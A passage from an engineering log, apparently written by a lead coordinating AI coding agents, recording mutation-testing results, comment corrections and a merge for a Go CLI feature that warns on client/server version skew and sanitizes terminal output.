   and the server never matched. Every cell returned `warned=False … clean` — **which reads
   exactly like "the whole class is rejected by the guard", a plausible and wrong
   conclusion.** Caught by the uniform-result rule rather than by suspicion: `bm_ok` is
   unambiguously valid semver and must warn, and it did not.
2. Two rows read wrong on a 0.9s server start; a 1.5s wait plus a per-row `curl` control
   fixed both. Same startup race that made a `utf8cut` row read 8 bytes in its first report.

**Neither changed a conclusion, because both were caught before the write-up.** Both would
have otherwise.

---

## 18. AMENDMENT 13 — `e137d145`. §14's json finding UNDERSTATED it, and the origin is in `run.go`.

### `encoding/json` escapes LESS than §14 said — four families, not two

Measured by the coder before editing, re-derived independently by the lead:

```
family              raw survives   verdict
C0 ESC 0x1b         false          ESCAPED
C0 CR 0x0d          false          ESCAPED
U+2028 line sep     false          ESCAPED
DEL 0x7f            true           NOT escaped
C1 CSI U+009B       true           NOT escaped   <- ANSI control introducer
U+202E bidi         true           NOT escaped
U+200B zero width   true           NOT escaped
```

§14 named DEL and U+202E. **C1 and the zero-widths also ride through**, and **C1 U+009B is
the single-byte CSI introducer — the same thing `ESC [` opens.** *(Precision the lead owes
here: "not escaped by `encoding/json`" is measured. Whether a UTF-8-encoded U+009B is
actually honoured as CSI depends on the terminal's 8-bit control handling and was NOT
measured — do not upgrade this to a demonstrated injection without testing it.)*

**The decision is unchanged and correct** — `--json` stays byte-exact, because those bytes go
to a **parser** and sanitizing would corrupt what an agent decodes. What changed is the
*reason*: the justification is now the **destination**, not the encoder. The new comment
states the measurement and names the boundary the old wording hid: **piping `--json`
straight to a TTY is outside the guarantee.**

**Nothing in the suite could ever have caught this.** The existing `--json` test uses
`"0.14.0\r"` — CR, the one family where the old claim happened to hold. It took reading the
sentence against the library.

### Item 2 was pinned with a TEST, not a comment — and the control is the point

`TestVersionCommandOutputStaysValidUTF8`: 199 ASCII + `€`×4, so the 200-**byte** boundary
lands inside a 3-byte rune. **Control:** swapping the render sink from `cellText` to
`compactText` — literally one of the two refactors this guards against — makes stdout
invalid UTF-8 and reddens **only this test**, while `TestVersionCommandSanitizesServerBuildInfo`
stays **green** (because `compactText` still strips controls). The auditor's "nothing pins
the ordering" demonstrated rather than asserted, and proof the new test is not a duplicate.

### 🔴 PROPOSED, NOT TAKEN — `run.go` carries the SAME false claim in STRONGER form, and it is the ORIGIN

`sanitizeTTY`'s doc says `--json` is safe because *"structural JSON encoding already escapes
these"* — where **"these"** is its own enumeration: C0, C1, DEL, **and the whole Cf
category**. Measured above: **false for three of the four.**

**That sentence is where the `version.go` wording came from.** The coder's own words: leaving
it means the next reader re-derives it into new code, *"which is exactly what happened to
me."* This is the doc-rot mechanism this branch has now hit twice — once in `CLAUDE.md`
(§10), once here — where a wrong sentence propagates into new work rather than merely sitting
there.

**Cost measured, not guessed:** `task lint:api:all` reports **4** pre-existing `errcheck`
findings in `run.go` (`:189`, `:202`, `:434`, `:582`), all the identical mechanical `_, _ =`
shape already applied in `root.go`/`version.go`. So `whole-files` makes this cheap — one
comment plus four one-token edits.

The coder left it correctly: out of scope, and `CLAUDE.md` says **propose** rather than do.
Escalated to the user in the same turn as this amendment.

### Coder's own disclosure on the moving-tree problem

**Both of its mutation rounds ran in the live worktree.** Internally safe (`cp` backups,
restores verified against `git diff`), but *"anything building from this tree during those
windows would have measured a mutated binary."* That is the other half of the auditor's and
reviewer's contamination — **the lead's frozen-SHA process fix covers all three.**

---

## 19. AMENDMENT 14 — tester round. 30 mutations, 2 SURVIVORS, no blocking findings.

Full `task gate:api` at `a4a18c0d`: **EXIT=0**, all seven populated slots, `lint:api` **0
issues** with the ratchet resolved against `origin/main`. Positive control that the suite
executed: **`RUN=478 PASS=478 FAIL=0 SKIP=0`**. Worked in a throwaway worktree with a
**private `GOLANGCI_LINT_CACHE`**, so it never touched the shared tree or the host-global
lint lock — the discipline the coder and auditor both hit.

Mutation hygiene: `cp` backups, mutation asserted **textually by sha256**, `go vet` before
reading any result, `git status` verified clean after each. Three folds failed to apply and
one typechecked-but-was-inert (`M24`: the deref placed *after* the guard) — **all re-run
rather than counted**, which is the assert-it-changed-BEHAVIOUR rule catching its own author.

### The three questions I dispatched — all three CLOSED

1. **The fixture DOES discriminate.** `M1b` (normalise the CLI side, forget the server side —
   exactly the bug a `("v0.11.8","v0.14.0")` fixture would certify) → **19 named FAIL lines**.
   The bare `"0.14.0"` wire form in `skewRows` is load-bearing and now proven so.
2. **The suite does NOT pass at the broken middle stage.** `M2` reddens `dev_cli` and
   `four-part_cli`. Worth knowing *where*: caught by the **unit table**, not end-to-end —
   `TestSkewWarningDevBuildDoesNotProbe` short-circuits on `IsStampedVersion`, a separate
   function, so it stays green under `M2`. The table is the load-bearing catcher.
3. **6b refuted a third time**, independently and before `d96b6fe8` landed. Agrees with §13
   row for row. **6b was right about its own four payloads and blind to a class it never
   contemplated.**

### The one place the suite was genuinely weak — and it is now CLOSED

At `ea71a367`, `M26` (keep control-stripping and folding, **drop only the 200-char cap**) →
**rc=0, zero failures**. The cap at the warning path was unpinned, and the consequence was a
**one-megabyte line on stderr of every command** from a hostile server. At `a4a18c0d` the
same fold reddens `unbounded_build_metadata`. **The coder's new row is doing real work, not
decorating.**

### 🔴 N1 (SURVIVOR) — the SERVER-side `IsValid` guard is behaviourally INERT, and its comment says otherwise

`M2a` (drop the server guard alone) → **rc=0, zero failures across all 478 tests.** Not a
fixture gap — measured exhaustively over a **39×39 cross product** of every shape either side
ships plus 20 invalid ones:

```
grid = 1521 rows | dropping the SERVER guard changes   0
                 | dropping the CLI    guard changes 378
```

Mechanism, and it follows from measurements already in this brief: `Compare(valid, invalid)`
is always `+1`, so a valid CLI against an invalid server is already silent via the `>= 0`
direction test; both-invalid gives `0`, also silent. **Only the CLI-side guard can change an
answer** — it is what stops B1's dev-build over-fire.

`versioncheck.go:70-73` claims *"Both guards are load-bearing and they guard different
populations."* **The populations half is right; "both load-bearing" is refuted for the
server side.** Those inputs exist, but the direction test handles them, not that guard.

**NOT a defect and NOT a code change.** `M27` (drop the server guard **and** flip the
direction to `!= 0`) reddens `dev_server`, `empty_server`, `four-part_server`, `cli_ahead` —
so it is real defence-in-depth that becomes live the moment the operator changes. **Fix the
COMMENT**: say the server guard is redundant *given the current direction test* and retained
so that changing that test cannot silently open the invalid-server path.

The same measurement retires a worry: the three `skewRows` no single fold can kill
(`dev server`, `empty server`, `four-part server`) are **not dead pins** — `M27` reddens all
three. They discriminate only in combination, which is what they are for.

### N2 (SURVIVOR) — `writeFileAtomic` → `os.WriteFile` goes fully GREEN

`M23` → rc=0, zero failures. §7 H4 says a hand-rolled `os.WriteFile` *"would follow a symlink
and would be a real vulnerability"*, and the code comment repeats it. **Nothing in the suite
can tell the two apart.** Shipped code is correct; the property is unpinned, so a future
refactor lands green. **LEAD RULING: add the pin** — symlink `version-check.json` at a file
outside the store dir, write, assert the target is unchanged. This branch's whole discipline
is that an unpinned property silently stops being true, and §17 is the same class.

### N3 — an assertion that cannot fire, crediting itself in its own comment

`versioncheck_test.go:458`'s `if len(errOut) > 4096` says *"The length bound is what
discriminates the build-metadata row."* Measured: under `M26` that row aborts at the
**earlier** `t.Fatalf` on `wantWarning` (`:443`), so `:458` never executes for it. **Positive
control that the line is not dead**: lowering the threshold to `> 0` reddens the four short
rows at 96 bytes each. So it runs for rows that can never exceed 4096 and is skipped for the
one that can. `wantWarning` is the real catcher. Redundant, not harmful — **the comment
credits the wrong assertion.**

Cosmetic, same file: under `M6` the `leading CR` row fails with *"no warning printed, so this
test proves nothing about sanitization"* when a warning **was** printed — `\r0.14.0` is
interpolated verbatim so the `Contains` misses. The row still catches the mutation; the
diagnostic misdescribes why.

### What this run did NOT reach — stated rather than implied

- **`./e2e/run-e2e.sh` NOT run** (~8 min, not asked for). Verified statically instead:
  `bash -n` clean, `UZI_VERSION_CHECK=0` present at `:1687`, and **6e's belt-and-braces claim
  confirmed** — neither `go build` passes `-ldflags`, so the harness binary is `dev`.
- **No live server, no k8s.** Everything is `FakeClient`; the bare-wire-form claim is
  inherited from §1, not re-derived.
- **`e137d145` is UNVERIFIED by the tester** — it landed after the gate run, and `M7`/`M19`
  touch that file, so treat those two as one commit stale. It checked both survivor sites by
  hand against the live tree and says only that they are *"almost certainly still live"*.

**Re-run offered at ~6 minutes** once a frozen SHA exists, harness already built. **Taking
it** — the branch will have a fourth commit.

---

## 20. AMENDMENT 15 — `d23599bb`. N-1/N-3/N-4/§17 closed. THE OUTSTANDING LIST IS BELOW AND IT IS THE WHOLE OF IT.

### 🔴 OUTSTANDING — four items, one commit, then FREEZE FOR THE RE-RUN

A `run.go` approval crossed the coder mid-turn and was re-proposed as though undecided.
**This section is the authoritative list so a crossing cannot lose one again.** Nothing else
is owed after these four.

1. **`run.go` `sanitizeTTY` doc — USER-APPROVED 2026-08-03, comment fix ONLY.** Correct the
   claim that JSON escapes C0, C1, DEL and all of Cf (false for three of four, §18), plus the
   four mechanical `_, _ = fmt.Fprint*` edits at `:189`, `:202`, `:434`, `:582`.
   **🔴 DO NOT rune-slice `compactText`** — the user considered it and declined: it is a
   shared helper behind run/steer/TUI rendering and this MR has not tested those surfaces.
   `TestVersionCommandOutputStaysValidUTF8` **stays a pin rather than becoming a
   redundancy**, and that is the accepted outcome, not an oversight.
   Wording precision: *"`encoding/json` does not escape U+009B"* is measured; *"a terminal
   honours it as CSI"* is **not** — do not write the second.
2. **§19 N1 — the server-side `IsValid` guard comment.** Say it is redundant *given the
   current direction test* and retained so that changing that test cannot silently open the
   invalid-server path. Refuted by a 1521-row cross product; the code stays as it is.
3. **§19 N2 — pin the `writeFileAtomic` symlink property** (lead ruling). Symlink
   `version-check.json` at a file outside the store dir, write, assert the target is
   unchanged. Today `os.WriteFile` substitutes for it fully green.
4. **§19 N3 — `versioncheck_test.go:458`'s comment credits the wrong assertion.** The
   `len(errOut) > 4096` check never executes for the build-metadata row; `wantWarning`
   catches it at `:443`.

**Then report the SHA and STOP WRITING.** The tester holds a built harness and re-runs the
full 30-mutation programme against a frozen tree in ~6 minutes. Three agents have had results
contaminated by building from this worktree mid-edit; the freeze closes it for all of them.

### What `d23599bb` landed

**N-1 fixed IN THE STORE, so both write sites inherit it.** A failed probe now moves
`checked_at` and **keeps any previously recorded version**; `RecordServerVersion` returns the
version now in effect, so neither caller re-reads. **That is also the whole N-3 fix** —
`uzi version` simply takes the returned value.

**Both constraints survive, and the control proves the right one paid.** Removing the
preserve block reddens the store-level test **and** the end-to-end one while **both
negative-cache tests stay green** — so the offline-laptop property is not what paid for the
fix. That was the thing worth checking, because preserving-on-failure and negative-caching
pull in opposite directions.

**Why the wiring mattered, and it is a general point:** the hook read its own local `probed`
variable, so a store-only fix would have been **invisible from the library's own tests**.
Hence an end-to-end test as well as a store-level one.

**§17 reproduced rather than trusted.** Removing both `TrimSpace` calls reddens exactly
`trailing_line_separator` (U+2028, Zl) and `trailing_no-break_space` (U+00A0, Zs) while
tab/CR/LF stay **green** — precisely the auditor's claim, that the rows which look like they
pin the trimming do not. The coder added U+00A0 alongside the U+2028 the lead specified,
since one row would have pinned only half the predicate.

**And `assertNoControlChars` had to widen or the new rows would have been decoration** — it
skipped whitespace entirely, and the one-line check splits on `\n`, which U+2028 is not. A
new test row that cannot fail is the shape this branch has now caught three times.

Also closed: the reviewer's nit 2 (`{"servers":null}` — structurally valid JSON with a nil
map, previously unpinned). **Not taken, correctly:** `withVersion`'s package-level mutation
is pre-existing, harmless without `t.Parallel()`, and in a file outside this change.

### Coder's self-correction, recorded because the pattern is the point

It had reported §15's N-4 bound as though the mechanism were new to it; it is the **third**
independent derivation, and the reviewer's actual contribution is the **boundary** (150
metadata chars warn, 400 silent). Volunteered, unprompted, about its own report.

---

## 21. AMENDMENT 16 — tester reconciliation. Data CLEAN by discriminator; the mutation counts are ONE MEASUREMENT IN THREE UNITS.

### The contamination check was answered decisively, not by assurance

The tester proved its detached tree held `ea71a367` **using the test that would have broken
if it had not**:

- At `ea71a367`, `exemptFromVersionCheck` carries `case "token":` only, and
  `versioncheck_test.go:347` lists `{"auth","status"}` under **`notExempt`**.
- Its `ea71a367` baseline was **`RUN=475 PASS=475 FAIL=0 SKIP=0`**.

**A green suite with `auth status` in `notExempt` is only possible on a tree where
`auth status` is NOT exempt.** Had it built the coder's uncommitted fix,
`TestExemptFromVersionCheck` would have failed. It did not. That is the exact inverse of the
auditor's 0-probes reading, and it is a *positive* discriminator rather than an absence.

Structural reason it could not have happened: `git worktree add --detach` materialises from
the object database, with `git status --short` empty and `git rev-parse HEAD` recorded at
every checkout. **The one thing it ran in the shared tree was the `task gate:api` that died
at `vet`, and it refused to report that as a gate result.**

### Its verdict already covers the SHA I asked for

```
git merge-base --is-ancestor f2f778d6 a4a18c0d              -> YES
git diff --stat f2f778d6..a4a18c0d -- api/ e2e/ deploy/ scripts/  -> EMPTY
```
`f2f778d6..a4a18c0d` is **docs-only**, so the gate and all 30 mutations measure `f2f778d6`'s
code exactly — and it re-ran the *whole* programme at the new tip rather than only the
flagged arms.

### 🔴 THE 4 / 5 / 6 COUNTS ARE ONE MEASUREMENT IN THREE UNITS — do not read them as a discrepancy

| SHA | subtest ROWS | tester's named-FAIL LINES |
|---|---|---|
| `ea71a367` | **4** | 5 |
| `a4a18c0d` | **5** (+`unbounded_build_metadata`) | 6 |

The auditor's **4** and the coder's **5** are each right for their own SHA (§14), **and the
tester reproduces both.** Its own figures run one higher because its grep counts the
**parent** `--- FAIL: TestSkewWarningSanitizesTheServerString` line as well as the subtests.
**Read its 5/6 as their 4/5.**

This is `CLAUDE.md`'s own lines-vs-rows trap — the same shape as the `--- PASS` indentation
entry there — arriving in a place where it would have looked like a *third* independent
measurement disagreeing with the first two. Recorded because reconciling it after the fact is
much harder than noting the unit now.

### Third independent derivation of the ellipsis mechanism, and the counter-intuitive parts hold

The tester traced the build-metadata payload's **silence** to `compactText` appending `…`
without having seen §13. It also reproduces the two results that read as wrong until the
mechanism is known: the auditor's **sharpest** payload (mid-line `\r`) is silent at the
warning path because `TrimSpace` strips only the **edges**; and plain 1 MiB `AAA…` is silent
because it is not valid semver — **only `0.14.0+<1 MiB>` gets through, at 1,048,673 bytes on
stderr.**

---

## 22. AMENDMENT 17 — 🔒 CODE FROZEN AT `57db471f`. Five code commits, no outstanding items.

```
57db471f  test(cli): pin the symlink property, fix three comments crediting the wrong mechanism
d23599bb  fix(cli): a failed probe no longer erases the cached server version   (N-1, N-3, N-4, §17)
e137d145  docs(cli): narrow the --json safety claim, pin the UTF-8 property
f2f778d6  absorb amendment 6 -- a third exempt command, cache forensics, TTL bounds
ea71a367  feat(cli): warn when the CLI is behind the server, and sanitize the build info it prints
```

`task gate:api` EXIT=0, tree clean, coder has stopped writing and confirmed it. **§20's
outstanding list is fully discharged.** Lead verified each of the four independently:
`run.go`'s false claim now sits *inside* its own correction (house style), `compactText` is
**not** rune-sliced (`s[:max]` intact, as the user decided), the symlink pin exists.

### The N2 pin does what it was ruled in for

Symlink at the cache path, assertion on the **link target**, plus a positive control that the
cache was actually written — *"a store that writes nothing would otherwise pass."*
Control: `writeFileAtomic` → `os.WriteFile` reddens it while `TestVersionCacheFileMode` and
`TestVersionCacheRoundTrip` stay **green**. The property is now held rather than assumed.

### 🔴 THE COUNT-DRIFT TRAP FIRED AGAIN, AND THE CODER HANDLED IT THE RIGHT WAY

Re-measuring §19 N3's positive control on its own tree, the coder got **six** rows at 96
bytes where the tester measured **four** — the two Zl/Zs rows from §17 landed in between.
**It recorded both figures with their trees rather than overwriting the tester's**, and said
so: *"Had I copied 'four' it would have been wrong within one commit of being written."*

That is the third count on this branch that moved between measurement and write-up (§14's
4-vs-5 by SHA, §21's 4/5/6 by unit, now this by commit). **Same lesson each time: cite the
shape and the tree, never a bare tally.**

### Three confidently-wrong comments, and why that is the finding rather than an anecdote

`sanitizeTTY`'s JSON claim, `SkewWarning`'s *"both guards are load-bearing"*, and the
coder's own `> 4096` self-credit. **All three read as authoritative, all three survived
multiple careful readings by different people, and each was refuted the moment somebody RAN
the thing it described.**

**The `run.go` one had already propagated into new code** — it is where `version.go`'s
wording came from — which is what separates this from a tidiness issue. Add the `CLAUDE.md`
claim from §10 and this branch found **four** instances of one mechanism: a sentence nobody
measured, believed because it was confident, copied forward into new work.

### The contamination story is complete, and all three traces to one lead decision

Auditor, reviewer and coder each had results produced from the shared worktree mid-edit. The
coder's own disclosure closes it: *"anything building from this tree during those windows
measured a mutated binary."* **The freeze closes it for all three, and the standing fix is:
validators get a frozen SHA that is not also the coder's live worktree.**

---

## 23. AMENDMENT 18 — tester re-run at `57db471f`. GREEN, 32 mutations, 3 survivors, ONE SHOULD-FIX.

Fresh detached worktree, clean at checkout and teardown, private `GOLANGCI_LINT_CACHE`.
`task gate:api` **EXIT=0** in 1m13s, all populated slots. Positive control:
**`RUN=486 PASS=486 FAIL=0 SKIP=0`** (478 at `a4a18c0d`, 475 at `ea71a367`).

**N2 CLOSED** — `M23` (`writeFileAtomic` → `os.WriteFile`) now reddens
`TestVersionCacheWriteDoesNotFollowASymlink`. It survived at both earlier SHAs. The pin the
lead ruled in does the work it was ruled in for.

### 🔴 M30 (SHOULD-FIX) — THE HOOK HALF OF THE N-1 FIX IS UNPINNED, AND LOSING IT LOSES THE WARNING

The N-1 fix has two halves. The **store** half is well pinned (`M29` reddens two tests). The
**hook** half is not: fold `maybeWarnVersionSkew:153` back to ignoring the returned value and
**the entire suite stays green** — which is precisely what the commit message warns against
(*"Take the RETURNED version, not `probed`"*).

**Why the shipped test misses it, and this is the instructive part:**
`TestSkewWarningSurvivesATransientProbeFailure` drives its outage through **`uzi version`**'s
call site (`:187`), not the hook's (`:153`), and its third step reads a **fresh** cache — so
`fresh == true` and the hook never calls `RecordServerVersion` at all. **The mutated line is
never exercised where its return value matters.**

**Measured as a real behavioural regression, not a no-op**, on the scenario the test cannot
reach (stale cache + failed probe + prior good reading — the offline laptop the next morning):

```
ARM 1  57db471f      probeCalls=1  warned=true   "uzi: CLI v0.11.8 is behind server 0.14.0…"
ARM 2  M30 applied   probeCalls=1  warned=false  stderr=""      <- WARNING LOST
```

The tester's probe **asserts its own precondition** (that the seeded entry is genuinely
stale) before concluding, so an accidentally-fresh cache fails loudly rather than passing
vacuously. **LEAD RULING: fix it.** One test. It is the half a user actually feels and it is
one careless refactor from silent — and this branch has ruled the same way twice already
(§19 N2, §17).

### The 4-vs-6 count settled, and the tester's own prediction was wrong

At `57db471f` the §19 N3 positive control reddens **6** rows at **exactly 96 bytes each**;
at `a4a18c0d` it was 4. The delta is the two new Zl/Zs rows. **The tester predicted 97/98
bytes** for U+2028 (3 bytes) and U+00A0 (2 bytes) **and says so: that was wrong.** `cellText`
strips those characters entirely, so all six print the identical clean `0.14.0` line. **The
assertion measures sanitized OUTPUT, not input** — which is the whole point of it, and a
reader predicting from the payload size would mis-set the threshold.

### The other two survivors, neither actionable

- **`M2a`** — the inert server-side guard. Re-derived at `57db471f`: **grid=1521, server
  guard changes 0, CLI guard changes 378.** Unchanged, as expected since the code did not
  move. Comment already corrected in `57db471f`. **No action.**
- **`M12b` (LOW, new)** — the second size cap, on `cliVersion` (`RecordServerVersion:292`),
  is unpinned. **Unlike the server-version cap it guards nothing reachable**: both call sites
  pass the package-level `version` (`root.go:16`), a compile-time ldflags stamp no user or
  server controls. Defence-in-depth mirroring its neighbour. **Recorded so nobody later reads
  its greenness as coverage.** No action.

### Not reached, stated rather than implied

`./e2e/run-e2e.sh` not run (`e2e/` unchanged since `a4a18c0d`, `bash -n` clean, harness binary
is `dev` so the hook short-circuits — §11 6e's belt-and-braces claim). No live server, no k8s;
all `FakeClient`, and the bare-`0.14.0` wire shape is inherited from §1 rather than
re-derived. Only `api/` was gated; `docs/` and `e2e/` verified statically at their unchanged
state.

---

## 24. AMENDMENT 19 — specs synced (§475, `21f90c05`). TWO ITEMS LEFT, one commit.

`specs/ai.md` §475 landed. Section number swept **three ways** — five local sibling
worktrees (working trees, so uncommitted sections would have shown), `origin/main` after a
fetch, and every remote branch — all agreeing on 474 as the highest claimed. That is the
numbering-collision rule in `CLAUDE.md` applied properly rather than assumed.

`specs/human.md` **untouched**; proposed text is with the user.

### 🔴 OUTSTANDING — two items, one commit, then the MR

1. **M30 — pin the hook half of the N-1 fix** (§23). Folding `maybeWarnVersionSkew:153`
   back to ignoring `RecordServerVersion`'s return leaves the **whole suite green** while
   silently losing the warning on stale-cache + failed-probe + prior-good-reading. The
   tester's throwaway probe is at
   `<scratchpad>/t144/zz_tester_m30_test.go` — adapt or take as is. **Seed the store at
   `now-2h`, run with a failing client, assert the warning**, and keep its
   assert-the-precondition step so an accidentally-fresh cache fails loudly rather than
   passing vacuously.
2. **`docs/cli.md:626` is WRONG and it is user-facing.** It reads *"for `uzi logout` and
   `uzi auth token`"* — **two** commands — while `versioncheck.go:89` exempts **three**
   (`logout`, `auth token`, `auth status`). Lead verified both sides at `d4d05c22`.
   Suggested: *"…or for `uzi logout`, `uzi auth token` and `uzi auth status`, which
   otherwise make no network call at all."*

**Item 2 is the FIFTH instance of this branch's dominant defect class, and the most
pointed one yet.** §14 corrected the code comment that said *"`logout` and `auth token` are
the two commands that make NO network call today"*; `docs/cli.md` was written from that same
wrong set and was never revisited. So the correction landed in one file and not its copy —
and `exemptFromVersionCheck`'s own doc warns that *stating the set as a list is how the third
member gets missed*, now demonstrated once more by the document that documents it.

Nothing in `task gate:api` reads `docs/cli.md` prose (`check-docs.mjs` covers frontmatter
and links only), so nothing would ever have caught it.

**Not taken, correctly:** the spec-keeper proposed the fix and did not apply it — out of its
dispatched scope, and the tree was frozen for a detached tester. `CLAUDE.md`'s fix-the-doc
rule explicitly permits proposing when a fix is out of scope.

**Left alone deliberately:** `docs/cli.md` also says the warning is not shown *"when the CLI
is newer than the server"*, where the shipped rule is ahead-**or-equal**. Not wrong — the
"when it is behind" framing covers it — just less precise than the code. Do not churn it.

---

## 25. USER APPROVAL — `specs/human.md` text, 2026-08-03. QUEUED behind the coder.

The user approved the spec-keeper's proposed block **as written**, to be inserted after
Feature #175 and before `## Startup admin seed`:

```markdown
## Feature #144 (item 1) — Warn when the CLI is behind the server

Tracked as GitLab issue vtmocanu/uzi#144 (item 1). Scoped MR, no PRD [user 2026-08-03].
Completes Feature #64/#175: `uzi version` reported both versions and never compared them.

- Every uzi command warns when the CLI is older than the server it talks to — not
  just `uzi version`. [user 2026-08-03, chosen from three placements]
- The warning goes to stderr. stdout and the exit code are unchanged. [user 2026-08-03]
- The server's version is probed on a cache, never once per command. [user 2026-08-03]
- The remedy offered is `brew upgrade uzi-cli`. [user 2026-08-03]
```

**A new section, not bullets appended to Feature #64** — the spec-keeper argued and the user
accepted that #64's bullets are about the CLI *existing and being agent-drivable*, while this
is a distinct behavioural contract with its own issue number.

**Only the placement decision goes in.** The spec-keeper reached this independently of the
lead and gave the sharper reason: `human.md`'s bar is that a rebuild must satisfy every item
in it, and **a rebuild cannot satisfy "one commit"**, nor would it have any reason to inherit
*"don't rune-slice `compactText`"* — a constraint that exists only because THIS change had
not tested run/steer/TUI. Those live in §475 as reasons, where they stay useful.

**QUEUED, not dispatched:** the coder holds the writer slot for §24's two items. Spec-keeper
goes immediately after it reports.

---

## 26. 🔴 STOP BEFORE THE MR — `main` ADVANCED 34 COMMITS AND OVERLAPS THIS BRANCH

Found by the lead at `3d8d2d9e`, checking a `main..HEAD` diffstat that read **2234
deletions** — which are not deletions at all. They are files that exist on `main` and not
here, i.e. **`main` moved**. Branch point is still `2d60c573`; `main` is now `136d976a`.

**Do NOT open the MR against this state.**

### What landed on `main`, and it is in our exact problem domain

- **`api/internal/termsafe/`** — a NEW leaf package holding *"uzi's terminal-safety
  predicate: the one place that decides which runes are allowed to reach a terminal"*.
  It cites **issue #180**, whose threat model names *"a server the user pointed `--url` at
  supplies … error messages and **build info**, and the CLI printed all of it raw"* — the
  auditor's H1, found independently, fixed independently, while we were working.
- **`api/internal/uzicli/sanitize.go`** — delegates `SanitizeTTY`/`CellText` to `termsafe`.
- **`api/cmd/uzi/hostile_server_test.go`** — `TestHostileServerCannotDriveTheTerminal`,
  which is the auditor's hostile-server harness as a committed test.
- Plus `fix/169-name-validator`, and `fb85e732 chore(lint): satisfy errcheck and ST1018 in
  the uzi CLI` — **the same errcheck edits our coder made**.

### 🔴 THE HALVES SPLIT, AND THE NAMING IS A TRAP

**H1 (injection) is FIXED on `main` and our fix is redundant.** `main`'s
`api/cmd/uzi/version.go:79` already reads
`fmt.Fprintf(env.Stdout, "server %-8s %s\n", row[0], uzicli.CellText(row[1]))`, citing #180.

**H2 (unbounded length) is NOT fixed on `main`, and ours is still needed.**
`uzicli.CellText` → `termsafe.CellText`, whose own doc says it **"deliberately does not
truncate"**. So a 1 MiB version string still prints in full on `main` today.

**The trap:** there are now TWO functions one letter apart with different behaviour —
`api/cmd/uzi`'s local `cellText` (truncates, via `compactText`'s `const max = 200`) and
`uzicli.CellText` (does not). **A naive merge that keeps `main`'s call site silently
reopens H2**, and everything about the name says it is the safe one.

### Merge surface — three conflicts, measured with `git merge-tree`, nothing touched

```
CONFLICT  CHANGELOG.md
CONFLICT  api/cmd/uzi/root.go
CONFLICT  api/cmd/uzi/version.go
auto      api/cmd/uzi/run.go, CLAUDE.md, specs/ai.md
```

### What survives and what does not

| our work | status against `main` |
|---|---|
| the skew warning (the feature) | **unaffected in substance**; should consume `termsafe` rather than the local helper |
| H1 sanitization of build info | **REDUNDANT** — `main` did it, as a shared package with a Unicode-wide biconditional invariant, which is better than ours |
| H2 length bound | **STILL NEEDED** — `main` left it open |
| the two CVE bumps | **STILL OURS ALONE** — `main` is on `x/text v0.38.0`, `goldmark v1.7.8` |
| the `run.go` comment fix | needs re-reading: `main` restructured the surface it describes |
| `CLAUDE.md`, `specs/*`, CHANGELOG | intact, CHANGELOG needs a conflict resolution |

**This is the documented default-branch-drift hazard**, and the reason it was caught is a
diffstat that did not look right — not a check anyone had scheduled.

---

## 27. AMENDMENT 20 — USER-APPROVED REWORK PLAN. Merge `main`, adopt `termsafe`, keep H2.

Approved 2026-08-03 after §26. **This supersedes the "branch complete" state — the branch is
NOT ready for an MR until this lands and is re-validated.**

### The merge

**`git fetch origin && git merge origin/main`. A PLAIN MERGE — never a rebase.** These SHAs
have been reviewed by three validators and this repo forbids force-push; rewriting them
invalidates every pinned measurement in §14-§25. Three conflicts, measured with
`merge-tree` at `2ba2314f`: **`CHANGELOG.md`, `api/cmd/uzi/root.go`,
`api/cmd/uzi/version.go`.** `run.go`, `CLAUDE.md`, `specs/ai.md` and `go.mod` auto-merge.

### 🔴 THE ONE THING THAT WILL SILENTLY GO WRONG

**`main` closed H1 and left H2 open, and the two functions are one letter apart.**

| | strips controls? | truncates? |
|---|---|---|
| `uzicli.CellText` → `termsafe.CellText` | yes | **NO** — its doc says *"deliberately does not truncate"* |
| `api/cmd/uzi`'s local `cellText` | yes | **yes**, via `compactText`'s `const max = 200` |

`main`'s `version.go:79` uses the **non-truncating** one. So **a 1 MiB version string still
prints in full on `main` today** — the auditor's H2, measured at 1,048,673 bytes on stderr,
is live in shipped code.

**Adopting `termsafe` without carrying a bound REOPENS H2, and every name involved says you
did the safe thing.** The tester's `M26` fold is the control that catches it: with the cap
gone, `TestSkewWarningSanitizesTheServerString/unbounded_build_metadata` must still redden.

### Scope, as approved

| item | action |
|---|---|
| the skew warning | **keep**, re-point its sanitization at `termsafe` |
| our H1 sanitization of `serverRows` | **DROP** — `main` did it, as a shared leaf package with a biconditional pinned over every rune in Unicode. Theirs is better. |
| the 200-char bound (H2) | **KEEP, and it now applies to `main`'s call site too** — that path is currently unbounded |
| `x/text` v0.39.0, `goldmark` v1.7.17 | **keep** — `main` is still on v0.38.0 / v1.7.8 |
| our `run.go` comment fix | **RE-READ before keeping.** `main` restructured this surface: `sanitize.go` now delegates to `termsafe`, whose package comment already carries a threat model. Ours may be redundant, misplaced, or still correct — decide by reading, not by assuming. |
| our errcheck `_, _ =` edits | `main`'s `fb85e732` made the same edits. Take whichever the merge produces; do not re-apply by hand. |
| `CHANGELOG` / `specs/*` / `CLAUDE.md` | keep; resolve the CHANGELOG conflict |

### Re-validation is NOT optional

Every measurement in §14 through §25 was taken against helpers that have now moved.
**The full 32-mutation programme, the gate, and a review+audit pass must be re-run against
the merged tip.** A green gate on a merge is not evidence that a pinned property survived
the merge — that is the *fixture-across-a-boundary* shape this repo documents, arriving via
someone else's refactor instead of via a cache.

---

## 28. AMENDMENT 21 — merge landed at `b00ecc83`. A SIXTH instance of the class, and it is `main`'s.

True merge, two parents (`804f2f1a` + `136d976a`), **no SHA rewritten** — so every pinned
measurement in §14-§25 still refers to a reachable commit. Gate EXIT=0, `lint:api` 0 issues,
`deadcode-gate` clean, `govulncheck` over `cmd/uzi` + `uzicli` + `termsafe` finds nothing.
**§26 and §27 were accurate**: three conflicts, exactly the predicted files.

### The H2 trap was avoided, and BOTH controls fire on the merged tree

The resolution keeps `main`'s #180 comment and reverts the **call** to the local truncating
`cellText`, which reaches the same `termsafe` predicate through `compactText` and adds the
200-char cap on top.

```
naive merge (local cellText -> uzicli.CellText)   TestVersionCommandSanitizesServerBuildInfo/unbounded  RED
M26 (drop compactText's 200 cap)                  unbounded_build_metadata AND unbounded                RED
```

**The tester's mandated control still holds after the helpers moved underneath it** — which
is the thing a green gate on a merge could never have told us.

### 🔴 SIXTH INSTANCE, AND THE FIRST THAT IS NOT OURS

Two sites landed by #180 claim `--json` escapes what `termsafe` strips. Measured on
`encoding/json` by the coder, **re-derived independently by the lead** — the two runs agree
on all eight rows:

```
                          Cf     Control  json-escaped
C0 ESC U+001B             false  true     true
DEL U+007F                false  true     FALSE
C1 CSI U+009B             false  true     FALSE
